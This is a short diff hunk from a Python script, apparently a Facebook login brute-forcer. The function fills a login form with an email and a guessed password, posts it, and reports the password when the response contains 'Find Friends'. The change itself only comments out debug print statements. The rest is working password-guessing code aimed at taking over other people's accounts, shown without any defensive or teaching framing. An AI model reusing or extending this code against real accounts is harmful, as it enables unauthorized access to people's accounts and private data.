@@ -42,10 +42,10 @@ def function(email,passw,i):
 		payload,cookie=create_form()
 		payload['email']=email
 	payload['pass']=passw
-	print(payload)
-	print(cookie)
-	#print('lsd : ',payload['lsd'])
-	#print(cookie)
+	# print(payload)
+	# print(cookie)
+	# print('lsd : ',payload['lsd'])
+	# print(cookie)
 	r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
 	if 'Find Friends' in r.text:
 		print('password is ',passw)
